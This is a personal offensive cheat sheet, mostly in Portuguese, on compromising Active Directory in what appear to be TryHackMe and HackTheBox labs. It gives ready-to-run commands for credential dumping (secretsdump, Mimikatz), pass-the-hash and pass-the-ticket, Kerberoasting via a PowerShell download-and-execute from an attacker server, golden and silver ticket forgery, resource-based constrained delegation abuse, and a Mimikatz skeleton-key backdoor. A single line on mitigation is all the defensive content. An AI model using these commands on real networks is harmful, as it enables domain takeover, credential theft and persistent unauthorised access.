*** Active Directory Enumeration ***

==================================== BloodHound ======================================

[+ SharpHound]

É a ferramenta de enumeration do BloodHound, provável ser detectado pelo blueteam.
	.\SharpHound.exe -c All
Após a coleta:

1. Iniciar o neo4j no kali
	neo4j console
	-> user: neo4j / senha:bloodhound
2. COpiar o arquivo de grafo do Sharphound para o Kali
	scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .
-> Caso esteja usando evilwinrm
	download <Sharphound ZIP>
	
[+ Blood Hound]

1. Selecionar a conta que possuimos como Node
2. Clicar com o Botão direito e setar como owned
3.1 Em Analysis, clicar em Find Domain Admins for Owned Accounts (Para criar alguma credencial que consiga ter acesso próximo ou à uma máquina que admins se loguem ou a ser um admin em si)
3.2 Em Analysis, clicar em Shortest Path to Unconstrained Delegation Systems (Para Kerberos Delegation)

==================== Net Command ==================

-> Criando um usuário
	net user s1r1ous s1r1ous /add /domain

-> Adicionando o usuário a um grupo do Windows
	net group "Exchange Windows Permissions" /add s1r1ous

====================== PowerView ======================

Para executar os comandos do abuseinfo do bloodhound

-> Localizado em transfer/PowerSploit/recon
	1. Conferir o PATH com $Env:PSModulePath
	2. Powershell.exe -ep bypass
	3. Import-Module .\PowerView.ps1
	
=================== AD DumpCreds ==========================

-> Conseguindo as hashes credenciais de Sysadmin de um grupo que contém os administradores
	cd /home/kali/Desktop/Tools/impacket/examples/
	./secretsdump.py htb.local/s1r1ous:s1r1ous@10.10.10.161

-> Logando com a hash
	cd /home/kali/Desktop/Tools/impacket/examples/
	./psexec.py aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local\Administrator@10.10.10.161 cmd.exe
	
============================== winPEAS ===============================



================================ Kerberos ===============================

[+ ============= Keberoast ================ ]


1. Colocando um HTTP server em /home/kali/Desktop/transfer/Empire/data/module_source/credentials

	> powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.15.242:8081/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"

2. Com as hashes ods tickets .kirbi em kerb-Hash0.txt, podemos quebrá-las utilizando o hashcat

	$ hashcat kerb-Hash0.txt -m 13100 /usr/share/wordlists/rockyou.txt

[+ ========== Pass the Ticket ==========]

-> Prepare Mimikatz & Dump Tickets
	1. >$ mimikatz.exe
	2. privilege::debug
	3. sekurlsa::tickets /export

-> Com isso teremos os Tickets do Kerberos em mãos e focaremos em Pass-the-Ticket para ganhar privilegios
	1. >$ mimikatz.exe
	2. kerberos::ptt <ticket>

-> Agora utilizaremos o Klist apenas para termos certeza que conseguimos personificar o ticket
	>$ klist

-> Para verificarmos nossa autoridade podemos ver os docs da Admin Share
	>$ dir \\10.10.202.173\admin$

[+ ========== GOLDEN TICKET ==========]

-> Dump the krbtgt hash
	1. $ mimikatz.exe
	2. privilege::debug
	3. lsadump::lsa /inject /name:krbtgt       // PARA CRIAR UM SILVER TICKET BASTA TROCAR O krbtgt pelo nome do serviço ex:MySQL

This will dump the hash as well as the security identifier needed to create a Golden Ticket :
=========================================================
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 

RID  : 000001f6 (502)                         
User : krbtgt                                 
                                              
 * Primary                                    
    NTLM : 72cd714611b64cd4d5550cd2759db3f6  
    LM   :                                    
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6 
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6 
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6
=========================================================

-> Com os dados em mãos, podemos criar o ticket :
	Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860  /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:502

-> Usando o Golden Ticket para acessar outra máquina
	1. >$ misc::cmd  - this will open a new elevated command prompt with the given ticket in mimikatz.
	2. >$ dir \\MAQUINA_ALVO\share$
	

[+ ======== Kerberos Resource-based Constrained Delegation ========]
-> Podemos usar quando temos permissões de escrita(GenericAll) sob uma máquina e criamos um objeto que pode personificar credenciais de administrador nos tickets TGT

1. Adicionar um novo Falso Objeto de Computador no AD
2. Configurar o novo computador falso com o privilégio de Constrained Delegation
3. Gerar as hashes para o novo computador falso

Dito isso :
-> On the Server side

1. Fazer o upload dos programas e criar o novo computador
Upload tools
	upload /home/kali/Desktop/transfer/Powermad/Powermad.ps1 pm.ps1
	upload /home/kali/Desktop/transfer/Ghostpack-CompiledBinaries/Rubeus.exe r.exe

Import PowerMad
	Import-Module ./pm.ps1

Set variables
	Set-Variable -Name "FakePC" -Value "FAKE01"
	Set-Variable -Name "targetComputer" -Value "DC"

With Powermad, Add the new fake computer object to AD.
	New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

2. Utilizar os comandos de Active Directory para dar privilégios
With Built-in AD modules, give the new fake computer object the Constrained Delegation privilege.
	Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')

With Built-in AD modules, check that the last command worked.
	Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount

3. Anotar as hashes do novo computador
With Rubeus, generate the new fake computer object password hashes. 
Since we created the computer object with the password 123456 we will need those hashes for the next step.
	./r.exe hash /password:123456 /user:FAKE01$ /domain:support.htb


-> On the Kali Machine
We have exploited the security hole and given the computer object “FAKE01″ the right to impersonate others. So we can now request a new Kerberos Ticket-Granting-Ticket(TGT) to the resources on”dc.support.htb” while impersonating the user administrator. This is done remotely from our attacking system(Kali).

4. Using getTGT from Impacket, generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. aesKey é aes256_cts_hmac_sha1
	cd /home/kali/Desktop/Tools/impacket/examples/
	./getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B

5. Set local variable of KERB5CCNAME to pass the ccahe TGT file for the requested service.
	export KRB5CCNAME=administrator.ccache

6. Use smbexec.py to connect with the TGT we just made to the server as the user administrator over SMB protocol.
	./smbexec.py support.htb/administrator@dc.support.htb -no-pass -k


[+ ========= Planting a Backdoor ===========]

1. Somente possível em Kerberos RC4 encryption e o mimikatz coloca como senha padrão ‘mimikatz’
	1. mimikatz.exe
	2. privilege::debug
	3. misc::skeleton
2. Acessando outras máquinas na floresta 
	1. net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
	2. dir \\Desktop-1\c$ /user:Machine1 mimikatz

[+ Mitigation]

Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

======================== Mimikatz ==========================

